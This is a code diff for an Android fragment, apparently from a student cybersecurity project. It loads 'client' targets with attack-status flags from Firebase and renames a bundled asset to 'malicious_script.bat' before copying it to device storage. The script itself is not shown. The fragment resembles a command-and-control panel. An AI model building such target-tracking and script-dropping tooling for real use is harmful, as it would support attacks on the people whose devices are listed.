@@ -7,11 +7,17 @@ import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Toast
+import androidx.core.view.isVisible
 import androidx.fragment.app.viewModels
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ValueEventListener
 import java.io.File
 import java.io.FileOutputStream
 import tr.com.mermela.cybersecurityfinalproject.R
 import tr.com.mermela.cybersecurityfinalproject.databinding.FragmentDeviceListBinding
+import tr.com.mermela.cybersecurityfinalproject.domain.TargetInfo
 import tr.com.mermela.cybersecurityfinalproject.ui.devicelist.adapter.DeviceListAdapter
 
 
@@ -35,7 +41,8 @@ class DeviceListFragment : Fragment() {
 
     override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
         super.onViewCreated(view, savedInstanceState)
-        initRecyclerView()
+        initListener()
+        loadDataFromFirebase()
     }
 
     private fun initListener() {
@@ -46,21 +53,43 @@ class DeviceListFragment : Fragment() {
         }
     }
 
-    private fun initRecyclerView() {
-        val list = arrayListOf<String>("Mertm","elfm","usertest")
-        adapter = DeviceListAdapter(list,::onDetailClick)
-
-        binding.rvDevices.adapter = adapter
-    }
-
 
     private fun onDetailClick(){
 
     }
 
+    private fun loadDataFromFirebase() {
+        binding.progressBar.isVisible = true
+        val databaseReference = FirebaseDatabase.getInstance().getReference("client")
+        databaseReference.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val usersList = mutableListOf<TargetInfo>()
+                for (userSnapshot in snapshot.children) {
+                    val username = userSnapshot.key ?: "Unknown"
+                    val attackStatus = userSnapshot.child("attack/attack_status").getValue(String::class.java)
+                    val isActive = userSnapshot.child("isActive").getValue(Boolean::class.java)
+                    usersList.add(TargetInfo(username, "", attackStatus, isActive))
+                }
+                updateRecyclerView(usersList)
+                binding.progressBar.isVisible = false
+            }
+
+            override fun onCancelled(error: DatabaseError) {
+                Toast.makeText(context, "Veri yüklenirken hata oluştu: ${error.message}", Toast.LENGTH_LONG).show()
+                binding.progressBar.isVisible = false
+            }
+        })
+    }
+
+    private fun updateRecyclerView(usersList: MutableList<TargetInfo>) {
+        usersList.add(TargetInfo("elifsimsek", "", "attackStatus", false))
+        adapter = DeviceListAdapter(usersList, ::onDetailClick)
+        binding.rvDevices.adapter = adapter
+    }
+
     private fun downloadFile() {
         val assetManager = requireContext().assets
-        val fileName = "yourfile.bat"
+        val fileName = "malicious_script.bat"
 
         val inputStream = assetManager.open(fileName)
         val outFile = File(requireContext().getExternalFilesDir(null), fileName)
